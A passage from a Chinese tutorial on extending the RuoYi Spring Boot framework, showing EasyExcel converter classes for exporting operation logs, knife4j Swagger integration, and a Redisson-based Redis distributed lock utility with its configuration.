        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"清空数据"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellData</span> <span class="token function">convertToExcelData</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> value<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"其他"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"新增"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"修改"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"删除"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"授权"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"导出"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"导入"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"强退"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"生成代码"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"清空数据"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CellData</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>ruoyi-system\com\ruoyi\system\domain\read\OperTypeConverter.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>converters<span class="token punctuation">.</span></span><span class="token class-name">Converter</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>enums<span class="token punctuation">.</span></span><span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">CellData</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>property<span class="token punctuation">.</span></span><span class="token class-name">ExcelContentProperty</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 操作类别字符串处理
 *
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"rawtypes"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OperTypeConverter</span> <span class="token keyword">implements</span> <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">supportJavaTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellDataTypeEnum</span> <span class="token function">supportExcelTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">.</span>STRING<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">convertToJavaData</span><span class="token punctuation">(</span><span class="token class-name">CellData</span> cellData<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Integer</span> value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> str <span class="token operator">=</span> cellData<span class="token punctuation">.</span><span class="token function">getStringValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"后台用户"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"手机端用户"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            value <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellData</span> <span class="token function">convertToExcelData</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> value<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"其他"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"后台用户"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">==</span> value<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            str <span class="token operator">=</span> <span class="token string">"手机端用户"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CellData</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>ruoyi-system\com\ruoyi\system\domain\read\StatusConverter.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>system<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>read</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>converters<span class="token punctuation">.</span></span><span class="token class-name">Converter</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>enums<span class="token punctuation">.</span></span><span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">CellData</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>property<span class="token punctuation">.</span></span><span class="token class-name">ExcelContentProperty</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 状态字符串处理
 *
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"rawtypes"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StatusConverter</span> <span class="token keyword">implements</span> <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">supportJavaTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellDataTypeEnum</span> <span class="token function">supportExcelTypeKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token class-name">CellDataTypeEnum</span><span class="token punctuation">.</span>STRING<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">convertToJavaData</span><span class="token punctuation">(</span><span class="token class-name">CellData</span> cellData<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"正常"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>cellData<span class="token punctuation">.</span><span class="token function">getStringValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">CellData</span> <span class="token function">convertToExcelData</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> value<span class="token punctuation">,</span> <span class="token class-name">ExcelContentProperty</span> contentProperty<span class="token punctuation">,</span>
            <span class="token class-name">GlobalConfiguration</span> globalConfiguration<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CellData</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> value <span class="token operator">?</span> <span class="token string">"正常"</span> <span class="token operator">:</span> <span class="token string">"异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、登录系统，进入系统管理-日志管理-操作日志-执行导出功能</p>
<h2><a id="10knife4jswagger_7052"></a>10、集成knife4j实现swagger文档增强</h2>
<p>如果不习惯使用<code>swagger</code>可以使用<code>前端UI</code>的增强解决方案<code>knife4j</code>，对比<code>swagger</code>相比有以下优势，友好界面，离线文档，接口排序，安全控制，在线调试，文档清晰，注解增强，容易上手。</p>
<p>1、<code>ruoyi-admin\pom.xml</code>模块添加整合依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- knife4j --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.github.xiaoymin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>knife4j-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.0.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、修改<code>ry-ui\views\tool\swagger\index.vue</code>跳转地址</p>
<pre><code class="prism language-vue">src: process.env.VUE_APP_BASE_API + "/doc.html",
</code></pre>
<p>3、登录系统，访问菜单系统工具/系统接口，出现如下图表示成功。</p>
<p><img alt="knife4j" src="https://img-blog.csdnimg.cn/img_convert/8cbca63a96199f7d70efa361e107ef93.png"/></p>
<p>提示</p>
<p>引用<code>knife4j-spring-boot-starter</code>依赖，项目中的<code>swagger</code>依赖可以删除。</p>
<h2><a id="11redissonredis_7085"></a>11、集成redisson实现redis分布式锁</h2>
<p><code>Redisson</code>是<code>Redis</code>官方推荐的<code>Java</code>版的<code>Redis</code>客户端。它提供的功能非常多，也非常强大，此处我们只用它的分布式锁功能。</p>
<p>1、引入依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- Redisson 锁功能 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.redisson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>redisson-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.16.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、添加工具类<code>RedisLock.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>redis</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>redisson<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">RLock</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>redisson<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">RedissonClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * redis锁工具类
 *
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Component</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RedisLock</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">RedissonClient</span> redissonClient<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 获取锁
     *
     * @param lockKey 锁实例key
     * @return 锁信息
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">RLock</span> <span class="token function">getRLock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> redissonClient<span class="token punctuation">.</span><span class="token function">getLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 加锁
     * 
     * @param lockKey 锁实例key
     * @return 锁信息
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">RLock</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">RLock</span> lock <span class="token operator">=</span> <span class="token function">getRLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> lock<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 加锁
     * 
     * @param lockKey 锁实例key
     * @param leaseTime 上锁后自动释放锁时间
     * @return true=成功；false=失败
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">,</span> <span class="token keyword">long</span> leaseTime<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> leaseTime<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 加锁
     * 
     * @param lockKey 锁实例key
     * @param leaseTime 上锁后自动释放锁时间
     * @param unit 时间颗粒度
     * @return true=加锁成功；false=加锁失败
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">,</span> <span class="token keyword">long</span> leaseTime<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span> unit<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> leaseTime<span class="token punctuation">,</span> unit<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 加锁
     * 
     * @param lockKey 锁实例key
     * @param waitTime 最多等待时间
     * @param leaseTime 上锁后自动释放锁时间
     * @param unit 时间颗粒度
     * @return true=加锁成功；false=加锁失败
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Boolean</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">,</span> <span class="token keyword">long</span> waitTime<span class="token punctuation">,</span> <span class="token keyword">long</span> leaseTime<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span> unit<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">RLock</span> rLock <span class="token operator">=</span> <span class="token function">getRLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> tryLock <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{<!-- --></span>
            tryLock <span class="token operator">=</span> rLock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>waitTime<span class="token punctuation">,</span> leaseTime<span class="token punctuation">,</span> unit<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> tryLock<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 释放锁
     * 
     * @param lockKey 锁实例key
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token class-name">String</span> lockKey<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">RLock</span> lock <span class="token operator">=</span> <span class="token function">getRLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 释放锁
     * 
     * @param lock 锁信息
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token class-name">RLock</span> lock<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、新增配置<code>RedissonConfig.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>redisson<span class="token punctuation">.</span></span><span class="token class-name">Redisson</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>redisson<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">RedissonClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>redisson<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">Config</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>condition<span class="token punctuation">.</span></span><span class="token class-name">ConditionalOnMissingBean</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * redisson配置
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RedissonConfig</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.redis.host}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> host<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.redis.port}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> port<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.redis.password}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>destroyMethod <span class="token operator">=</span> <span class="token string">"shutdown"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@ConditionalOnMissingBean</span><span class="token punctuation">(</span><span class="token class-name">RedissonClient</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">RedissonClient</span> <span class="token function">redissonClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Config</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        config<span class="token punctuation">.</span><span class="token function">useSingleServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token string">"redis://"</span> <span class="token operator">+</span> host <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 更多.set</span>
        <span class="token keyword">return</span> <span class="token class-name">Redisson</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、使用方式</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Autowired</span>
<span class="token keyword">private</span> <span class="token class-name">RedisLock</span> redisLock<span class="token punctuation">;</span>

